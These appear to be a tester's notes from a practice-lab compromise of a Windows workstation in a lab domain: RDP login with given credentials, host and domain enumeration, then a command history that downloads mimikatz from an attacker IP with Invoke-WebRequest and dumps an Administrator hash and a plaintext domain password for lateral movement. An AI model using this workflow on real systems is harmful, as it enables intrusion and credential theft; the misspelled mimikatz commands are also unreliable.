# VM 3 192.168.x.95
# Summary
- Initial access via provided creds eric.wallows
- RDP with creds
- Account had administrator rights
- Dropped mimikatz onto the box and found user account 'apache'
- 'apache' would lead to a winrm session on box .96
# Flag Location
- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### Eric.Wallows / EricLikesRunning800
`xfreerdp3 /u:Eric.Wallows /p:EricLikesRunning800 /v:192.168.135.95`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.95 --top-ports 100`

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8443/tcp open  ssl/https-alt AppManager
```
## System Info
`systeminfo`
```
Host Name:                 SECURE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          windows
Registered Organization:
Product ID:                00331-10000-00001-AA313
Original Install Date:     7/19/2022, 8:20:09 PM
System Boot Time:          2/20/2025, 9:57:22 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,095 MB
Available Physical Memory: 830 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 1,208 MB
Virtual Memory: In Use:    3,591 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    secura.yzx
Logon Server:              \\DC01
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB5013624
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB5033052
                           [08]: KB5013942
                           [09]: KB5014032
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.159.95
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Eric.Wallows\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   SECURE
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
HOMEDRIVE                      C:
HOMEPATH                       \Users\Eric.Wallows
LOCALAPPDATA                   C:\Users\Eric.Wallows\AppData\Local
LOGONSERVER                    \\DC01
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\Eric.Wallows\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPow...
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ERIC~1.WAL\AppData\Local\Temp
TMP                            C:\Users\ERIC~1.WAL\AppData\Local\Temp
USERDNSDOMAIN                  SECURA.YZX
USERDOMAIN                     SECURA
USERDOMAIN_ROAMINGPROFILE      SECURA
USERNAME                       Eric.Wallows
USERPROFILE                    C:\Users\Eric.Wallows
windir                         C:\Windows
```
## Domain Controller Info
`nltest /dsgetdc:secura`
```
         DC: \\DC01
      Address: \\192.168.159.97
     Dom Guid: 87c65b4a-0215-4b85-8e9a-800aca53a1c0
     Dom Name: SECURA
  Forest Name: secura.yzx
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10
```
# Services    
	http://192.168.141.95:44444/index.do -> ManageEngine App Manager

## Command History
```c
    Invoke-WebRequest -Uri "http://192.168.45.219/mimikatz.exe" -OutFile "mimikatz.exe"
    mimikatz
    -> riviliege::debug
    -> token::elevate
    -> sekursa::logonpasswords
        Authentication Id : 0 ; 712535 (00000000:000adf57)
        Session           : Interactive from 1
        User Name         : Administrator
        Domain            : SECURE
        Logon Server      : SECURE
        Logon Time        : 2/20/2025 9:58:06 PM
        SID               : S-1-5-21-3197578891-1085383791-1901100223-500
                msv :
                [00000003] Primary
                * Username : Administrator
                * Domain   : SECURE
                * NTLM     : a51493b0b06e5e35f855245e71af1d14
                * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
                tspkg :
                wdigest :
                * Username : Administrator
                * Domain   : SECURE
                * Password : (null)
                kerberos :
                * Username : Administrator
                * Domain   : SECURE
                * Password : (null)
                ssp :
                credman :
                [00000000]
                * Username : apache
                * Domain   : era.secura.local
                * Password : New2Era4.!
                cloudap :
    // FOUND apache New2Era4.!
```